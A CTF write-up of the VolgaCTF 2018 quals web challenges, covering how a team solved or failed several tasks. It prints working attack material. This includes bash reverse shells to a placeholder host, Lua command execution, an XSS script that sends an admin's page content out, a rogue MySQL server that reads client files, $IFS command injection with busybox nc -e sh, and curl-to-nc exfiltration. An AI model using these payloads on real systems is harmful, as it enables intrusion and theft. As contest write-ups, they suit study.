# Volgactf CTF 2018


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180324-volgactf/) of this writeup.**


 - [Volgactf CTF 2018](#volgactf-ctf-2018)
   - [Pwn](#pwn)
   - [reverse](#reverse)
   - [Web](#web)
     - [Old Government Site (solved by sasdf, written by bookgin)](#old-government-site-solved-by-sasdf-written-by-bookgin)
     - [Guess book (solved by shw15 and sasdf, written by bookgin)](#guess-book-solved-by-shw15-and-sasdf-written-by-bookgin)
     - [Corp monitoring (unsolved, written by bookgin, special thanks to admin Aleksey)](#corp-monitoring-unsolved-written-by-bookgin-special-thanks-to-admin-aleksey)
     - [Lazy Admin (solved by sasdf &amp; bookgin, written by bookgin)](#lazy-admin-solved-by-sasdf--bookgin-written-by-bookgin)
     - [SEO kings (solved by sasdf &amp; bookgin, written by bookgin)](#seo-kings-solved-by-sasdf--bookgin-written-by-bookgin)
     - [Forgotten Task (unsolved, written by bookgin, special thanks to Alexander Andreev)](#forgotten-task-unsolved-written-by-bookgin-special-thanks-to-alexander-andreev)
     - [Shop request (no one solved)](#shop-request-no-one-solved)
   - [Crypto](#crypto)
   - [forensics](#forensics)



## Pwn 

## reverse

## Web

### Old Government Site (solved by sasdf, written by bookgin)

By manipulting the parameter `page?id[]=18` to triger a error, we can see part of the source code. We soon found a hidden page at `page?id=18`

In the page we can POST a url, and the server will fetch it. The server agent is `ruby`. Take a look at [CVE-2017-17405](), ruby's feature.  So let's get a reverse shell.

```
# POST the url
|bash -c 'bash -i >& /dev/tcp/1.2.3.4/5678 0>&1'
```

`cat /flag` and win!

### Guess book (solved by shw15 and sasdf, written by bookgin)

People can create a post with title and content in the website, but no sign of XSS. We find lots of fake flags , as well as a shared Google doc link where people can make some fun there. 

Soon after, sasdf found the serach query is vulnerable to injection. Here is the PoC:

```sh
# bbb 
GET '/search?search=" and "bbb HTTP/1.0\r\n\r\n'
# 2
GET '/search?search=" and 1+1 or " HTTP/1.0\r\n\r\n
# error
GET '/search?search=" AND 1+1 or " HTTP/1.0\r\n\r\n
```

But this is not MySQL, becasue MySQL is case insentitive. After a few tries, we still have no idea what kind of this SQL language is, and stuck for hours.

Here comes the CTF saver. shw15 found it is [Lua](https://www.lua.org/). The syntax is simply `os.execute("sleep 10")`. 

Then that's all. We have RCE and discover the flag is in `/etc/passwd`.

Once you know it's lua, the challenge becomes a piece of cake.

### Corp monitoring (unsolved, written by bookgin, special thanks to admin Aleksey)

A monitoring server will monitor the host via this API The timestamp doesn't matter at all.

`http://corpmonitoring.quals.2018.volgactf.ru:5000/api/check_host?target=corpmonitoring.quals.2018.volgactf.ru&_=1521894046582`

We tried some SQL/command injection but failed. 
By scanning the host, we found listening ports 21(ftp),22(ssh),80(http),3306(mysql),5000(monitoring website).
Also, we tried to make the host monitor our server, `/api/check_host?target=MYIP`. The monitoring procedure is:

- TCP handshake with port 21
- TCP handshake with port 22
- HTTP Request to port 80 (no js engines)
- MySQL client `monitoring` with encrypted password connects to port 3306. 
  - If it logs in successfully, execute these queries:
  - SET NAMES 'utf8' COLLATE 'utf8_general_ci'
  - SET @@session.autocommit = OFF
  - SHOW DATABASES

The first idea is to perform a man-in-the-middle attack, making the monitoring host connect to itself and intercepting the query.
However, after the client logins to its own MySQL server, the databaseis empty. We found nothing interesting there.
Soon after, the MySQL server is down because someone changes the password! We ask the admins, and the official said the MySQL server is not required to be up in this challenge.

And... we stuck here for hours. We try to decrpyt the MySQL plaintext password, abuse the MySQL error message as the Flask-SQLAlchemy
 backend will show the error message, but both methods seem impossible.
 

After the competition ends, we ask one of the admins Aleksey about the solution. The main idea behind is http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/. Attack the client directly! What a cool idea!

We make it work after the competition, which gets the flag in a jiffy. Here is the rogue MySQL sever code: Note that it uses [Python3-pwntools](https://github.com/arthaud/python3-pwntools).

```python
#!/usr/bin/env python3
# Python 3.6.4
from pwn import *

server = listen(3306)

server.wait_for_connection()
# Server Greeting
server.send(bytes.fromhex('4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'))
# Client login request
print(server.recv())
# Server Response OK
server.send(bytes.fromhex('0700000200000002000000'))
# Client SQL query
print(server.recv())
# Server response with evil
query_ok = bytes.fromhex('0700000200000002000000')
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
server.send(dump_etc_passwd)

# This contains the flag VolgaCTF{hoz3foh3wah6ohbaiphahg6ooxumu8ieNg7Tonoo}
print(server.recv())
```

The key is to discover **the client ability** bit in the client login request. However, we forgot to do that :(
```
.... .... 1... .... = Can Use LOAD DATA LOCAL: Set
```

This task has been solved by only 5 teams.


### Lazy Admin (solved by sasdf & bookgin, written by bookgin)

First, navigate to `robots.txt` and found `unauthorized_users.txt` is disallowed. The file contains username and password.

Next, we are allowed to send a URL link to admin. However, the hostname will be overwritten. Thus it's unable to redirect the admin to other websites.

We also note that the header `Access-Control-Allow-Credentials` is set, which is obvious a challenge about XSS attack.

Then here is the key: If you're not logged in, access `profile.php` will redirect to `index.php?redir=profile.php`. It seems that we can abuse the redirection parameter.

After a few tries, we found the url parser is vulnerable. `/index.php?redir=http:http://1.2.3.4/` will bypass the parser validation, redirecting to `http://1.2.3.4/`.

Acctually, there are a number of ways to bypass the parser. Either [manipulating the host parameter](https://blog.harold.kim/2018/03/volgactf-2018-lazy-admin-writeup) (by @stypr) or using [space](https://gist.github.com/pich4ya/17dd5ef496c8fb11b79f7e7ea40d601f) (by pich4ya) can bypass the check.

So the rest is easy. We create a page to steal the page content/cookies, and send the redirection link to admin. If the bot allows cross domain requests, we can steal the page content!

```htmlmixed=
<img id="image"></img>
<script>                                                                                                                                 
var xhr = new XMLHttpRequest();                                                                                                          
xhr.withCredentials = true;                                                                                                              
xhr.open('GET', 'http://lazy-admin.quals.2018.volgactf.ru/profile.php', false);                                                          
xhr.send(null);                                                                                                                          
var flag = btoa(xhr.responseText);                                                                                                       
document.getElementById("image").src = "http://mywebsite.com/?a="+flag;                                                           
</script>
```

Acctually it works. We just decode it and get the flag. It seems that the bot is using phantomjs with `-web-security=false`, which disables cross domain XHR.

I spent lots of time on trying to bypass same origin policy, but I don't know they disable the feature. Next time I'll remember just give it a try first!

### SEO kings (solved by sasdf & bookgin, written by bookgin)

In the challenge, there is only one page with a form. We first manipulate some parameters to see if injection is possible. We accidently found a error page with lots of useful information by trying sending an array `site[]=`.

```shell
curl 'http://seo-kings.quals.2018.volgactf.ru:8080/' -A "Mozilla" --data 'site[]=asd'
```

So we have part of the ruby source code:

```ruby
def runAdmin(site)
pid = Process.spawn("phantomjs --web-security=no bot.js '" +  URI.escape(site)  + "'")  
begin
    Timeout.timeout(1) do
    Process.wait(pid)
  end 
rescue Timeout::Error                                                           
    Process.kill('TERM', pid)
end
```

Phantomjs? Cool, it's XSS challenge. However, we tried various of XSS payload but they all failed to work. ([NULLKrypt3rs](https://github.com/NULLKrypt3rs/CTFs/blob/master/VolgaCTF-2018/SEOkings.md) makes the XSS work, actually.) Therefore, we start to try other attacks.

The ruby source uses `URI.escape(site)` to prevent command injection. It sounds sorts of weird. Why escape URI? It shoud escape command line parameters. That's the signal of possible command line injection.

Here is the PoC:

```
# response time 0.4s
a';sleep$IFS$((0));'
# response time 1.4s, because the process will timeout
a';sleep$IFS$((5));'
```

The space is escaped, so `$IFS` is used as space:) The appending `$((0))` is to make the shell interpret `$IFS` variable properly.

Thanks to @sasdf. Here is his payload:
```
POST payload:
site=a';$(nc$IFS$((1)).2.3.4$IFS$((9000)));'

Server side:
echo "ruby -e require('base64');system(Base64.decode64('...'))" | ncat -lvp 9000 --send-only

Base64 payload:
curl http://127.0.0.1:8080/admin?token=d595462f496fd347796b60b605b72ff6 -L -vv 2>&1 | nc 1.2.3.4 9001
```

[jinmo123](https://ctftime.org/writeup/9366)'s payload is more elegant. The `nc` in busybox supports `-e` option, which can be used to pipe into shell to execute. 

We modified his payload to connect with reverse shell:

```python
#!/usr/bin/env python3
# Python 3.6.4
import requests
# python3 pwntool
from pwn import *

server = listen(12345)
server_result = listen(12346)

payload = "a';busybox$IFS$()nc$IFS$()1.2.3.4$IFS$()12345$IFS$()-esh;'"
requests.post('http://seo-kings.quals.2018.volgactf.ru:8080/', data=dict(site=payload))

cmd = "bash -c 'bash -i >& /dev/tcp/1.2.3.4/12346 0>&1'"

server.wait_for_connection()
server.sendline(cmd)
server.close()
server_result.wait_for_connection()
server_result.interactive()
```

### Forgotten Task (unsolved, written by bookgin, special thanks to Alexander Andreev)

The challenge's backend is PHP + laravel. The cookies is encrypted with `APP_KEY` defined in `.env`.

Additionally, the server's nginx configure file is provided:
```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;

    index index.php index.html;

    server_name _;

    location / {
        root /var/www/html;
    }

    location /laravel {
        alias /var/www/laravel/public/;
        try_files $uri $uri/ @laravel;

        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        }
    }

    location @laravel {
        rewrite ^/laravel/(.*)$ /laravel/index.php?$1 last;
    }
}
```

We got stuck here until the competition ended:( 

We ask Alexander Andreev for his solution: 

>  Well, first of all, there was nginx path traversal which allows to steal .env file with app_key ([http://forgotten-task.quals.2018.volgactf.ru/laravel../.env](http://forgotten-task.quals.2018.volgactf.ru/laravel../.env)). Then you can find out that you recieve a cookie like volgactf\_task\_session. Is'a base64 encoded json. Inside there was a field "value" and "iv" so you can decrypt via AES-256-CBC. There was a serialized PHP object. Then you can construct bad object and get a shell :)

The key is to bypass nginx path matching and steal `.env` for the `APP_KEY`. 

It's worth mentioning that there is an [Nginx configuration static analyzer](https://github.com/yandex/gixy). The website may be vulnerable if there is misconfiguration of nginx config file.

### Shop request (no one solved)

[Original writeup by the author](https://github.com/shvetsovalex/ctf/tree/master/2018/VolgaCTF-quals/Shop%20quest).

It looks like a challenging problem, XSS+SQLi+RCE. It's a pity we don't have much time to do it.

## Crypto

## forensics

